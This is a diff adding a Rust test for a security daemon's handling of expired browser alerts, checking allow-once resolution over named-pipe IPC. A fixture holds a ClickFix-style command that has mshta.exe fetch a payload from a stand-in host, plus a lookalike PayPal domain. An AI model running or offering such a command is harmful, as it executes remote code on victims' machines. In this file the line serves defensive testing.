@@ -5116,3 +5116,149 @@ async fn daemon_p4_24_short_lived_process_during_saturated_pending_late_backfill
         "all {EXPECTED_TOTAL} processes must preserve their expected origin_url with zero loss"
     );
 }
+
+#[tokio::test]
+async fn daemon_p4_25_expired_suspended_layer4_browser_alert_resolves_allow_once() {
+    let defense = Arc::new(MockDefense::new());
+    let store = LedrStore::open_in_memory().expect("open store");
+    let pipe_name = unique_test_pipe_name();
+    let engine = DaemonEngine::start_with_motw_inspector(
+        store.clone(),
+        SigmaEngine::from_rules(Vec::new()).expect("empty sigma"),
+        EarlyPruner::default(),
+        DaemonConfig {
+            pipe_name: pipe_name.clone(),
+            dev_mode_bypass_ui_auth: true,
+            strict_pipe_dacl: false,
+            ..DaemonConfig::default()
+        },
+        defense.clone(),
+        Arc::new(RecordingNotifier::default()),
+        Arc::new(MapBinaryInspector::default()),
+        Arc::new(NullLiveProcessInspector),
+        Arc::new(MapMotwInspector::default()),
+    );
+
+    let event_ts = 1_760_099_000_000;
+    let BrowserEventOutcome::Recorded(alert) = engine
+        .record_browser_event(
+            BrowserSecurityEventType::ClickFixPastejacking,
+            "https://clickfix.example.invalid/verify",
+            Some("mshta.exe https://clickfix.example.invalid/payload"),
+            event_ts,
+        )
+        .expect("record browser alert")
+    else {
+        panic!("expected recorded browser alert");
+    };
+    assert_eq!(alert.source_layer, "LAYER_4_BROWSER");
+    assert_eq!(alert.process_instance_id, None);
+    assert_eq!(alert.status, AlertStatus::Pending);
+
+    // Transition the processless LAYER_4_BROWSER alert to ExpiredSuspended via the same
+    // timeout path used by the daemon's periodic sweep.
+    let expired = store
+        .expire_pending_alerts(event_ts + 60_001)
+        .expect("expire pending alerts");
+    assert_eq!(expired, 1);
+    let stored_expired = store
+        .get_alert(&alert.alert_id)
+        .expect("get expired alert")
+        .expect("expired alert exists");
+    assert_eq!(stored_expired.status, AlertStatus::ExpiredSuspended);
+
+    // AllowPermanent must still be rejected on an ExpiredSuspended processless LAYER_4_BROWSER alert.
+    let perm_err = engine
+        .resolve_alert_with_outcome(
+            &alert.alert_id,
+            AlertDecision::AllowPermanent {
+                use_signer_if_available: false,
+                allow_dest: None,
+            },
+        )
+        .expect_err("AllowPermanent must be rejected for processless LAYER_4_BROWSER");
+    assert!(
+        !perm_err.is_empty(),
+        "expected explanatory error message on AllowPermanent rejection"
+    );
+    assert_eq!(
+        store
+            .get_alert(&alert.alert_id)
+            .expect("re-fetch alert")
+            .expect("alert exists")
+            .status,
+        AlertStatus::ExpiredSuspended,
+        "failed AllowPermanent must leave ExpiredSuspended status unchanged"
+    );
+
+    // Resolve via live Named Pipe IPC (`IpcRequest::ResolveAlert`) with `AlertDecision::AllowOnce`.
+    let ipc_handle = start_ipc_server(Arc::clone(&engine)).expect("start IPC server");
+    let pipe_for_req = pipe_name.clone();
+    let alert_id_for_req = alert.alert_id.clone();
+    let ipc_resp = tokio::task::spawn_blocking(move || {
+        send_pipe_request(
+            &pipe_for_req,
+            &IpcRequest::ResolveAlert {
+                alert_id: alert_id_for_req,
+                decision: AlertDecision::AllowOnce,
+            },
+        )
+    })
+    .await
+    .expect("IPC request join");
+    match ipc_resp {
+        IpcResponse::Ack { message } => {
+            assert!(
+                message.contains("APPROVED_ONCE"),
+                "expected APPROVED_ONCE in Ack message, got: {message}"
+            );
+            assert!(
+                !message.contains("rule "),
+                "AllowOnce on processless LAYER_4_BROWSER must not save a rule: {message}"
+            );
+        }
+        other => panic!("expected IpcResponse::Ack, got {other:?}"),
+    }
+
+    let resolved = store
+        .get_alert(&alert.alert_id)
+        .expect("get resolved alert")
+        .expect("resolved alert exists");
+    assert_eq!(resolved.status, AlertStatus::ApprovedOnce);
+    assert!(resolved.resolved_at_ms.is_some());
+    assert!(
+        store.list_rules(None).expect("list rules").is_empty(),
+        "AllowOnce must not create any saved rule"
+    );
+    assert!(defense.added_wfp().is_empty());
+    assert!(defense.suspends().is_empty());
+
+    // Verify a second ExpiredSuspended browser alert resolves cleanly via direct
+    // `resolve_alert_with_outcome` as well, confirming `saved_rule_id == None`.
+    let BrowserEventOutcome::Recorded(alert2) = engine
+        .record_browser_event(
+            BrowserSecurityEventType::HomographWarning,
+            "https://paypa1.example.invalid/",
+            None,
+            event_ts + 100,
+        )
+        .expect("record second browser alert")
+    else {
+        panic!("expected recorded second browser alert");
+    };
+    assert_eq!(
+        store
+            .expire_pending_alerts(event_ts + 60_200)
+            .expect("expire second alert"),
+        1
+    );
+    let outcome = engine
+        .resolve_alert_with_outcome(&alert2.alert_id, AlertDecision::AllowOnce)
+        .expect("AllowOnce resolves ExpiredSuspended LAYER_4_BROWSER");
+    assert_eq!(outcome.alert.status, AlertStatus::ApprovedOnce);
+    assert!(outcome.alert.resolved_at_ms.is_some());
+    assert_eq!(outcome.saved_rule_id, None);
+
+    ipc_handle.shutdown().await;
+    engine.shutdown_and_flush().await.expect("shutdown engine");
+}
